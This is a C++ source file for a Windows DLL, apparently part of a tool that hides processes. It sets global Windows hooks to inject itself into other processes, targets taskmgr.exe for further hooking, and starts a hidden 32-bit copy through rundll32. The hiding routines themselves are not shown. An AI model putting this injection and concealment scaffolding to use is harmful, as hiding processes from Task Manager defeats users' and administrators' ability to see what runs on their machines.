// SimpleHideToolDll.cpp : Defines the exported functions for the DLL application.
//

#include "stdafx.h"
#include "SimpleHideToolDll.h"
#include "Common.h"
#include "TaskManagerDetector.h"
#include "Utils.h"

extern HMODULE hCurrentModule;
HHOOK g_hook = nullptr;

static LRESULT CALLBACK HookProc(int    nCode, WPARAM wParam, LPARAM lParam)
{
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

static LRESULT CALLBACK newHookProc(int    nCode, WPARAM wParam, LPARAM lParam)
{
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

bool InstallHooks()
{
    std::wstring processName = GetCurrentProcessName();
    const bool isTaskManager = processName.find(L"taskmgr.exe") != std::wstring::npos;
    if (isTaskManager)
    {
        const bool result = TaskManagerDetector::GetInstance()->InstallHooks();
        _ASSERT(result);
    }

    return true;
}

bool Start()
{
    SHELLEXECUTEINFOW ShExecInfo = { 0 };
    ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFOW);
    ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
    ShExecInfo.hwnd = NULL;
    ShExecInfo.lpVerb = NULL;
    ShExecInfo.lpParameters = NULL;
    ShExecInfo.lpDirectory = NULL;
    ShExecInfo.nShow = SW_HIDE;

    g_hook = SetWindowsHookEx(WH_CBT, HookProc, hCurrentModule, 0);

    if (g_hook == 0)
    {
        return false;
    }

#ifdef _M_X64
    std::wstring RunDll32App = GetSystemDirPathWow64();
    std::wstring ubUmhsHookDllPath = RunDll32App;

    RunDll32App += L"\\rundll32.exe";
    ubUmhsHookDllPath += L'\\';
    ubUmhsHookDllPath += X86HookDllName;

    std::wstring wsCommand = L"\"";
    wsCommand += ubUmhsHookDllPath;
    wsCommand += L"\"";
    wsCommand += L",?StartRundll@@YA_NXZ";

    ShExecInfo.lpVerb = L"open";
    ShExecInfo.lpParameters = wsCommand.c_str();
    ShExecInfo.lpFile = RunDll32App.c_str();

    ShellExecuteExW(&ShExecInfo);

#endif

    return true;
}

bool StartRundll()
{
    MSG Msg = { 0 };
    OSVERSIONINFO osvi = { 0 };
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);

    if (g_hook != 0)
    {
        return false;
    }
#pragma warning(disable: 4996)
    GetVersionEx(&osvi);
#pragma warning(default: 4996)

    if (osvi.dwMajorVersion <= 5)
    {
        g_hook = SetWindowsHookEx(WH_KEYBOARD, newHookProc, hCurrentModule, 0);

        if (g_hook == 0)
        {
            return false;
        }
    }
    else
    {
        g_hook = SetWindowsHookEx(WH_CBT, HookProc, hCurrentModule, 0);

        if (g_hook == 0)
        {
            return false;
        }
    }

    Sleep(200);
    ZeroMemory(&Msg, sizeof(MSG));
    PeekMessage(&Msg, NULL, 0, 0, PM_REMOVE);

    return true;
}



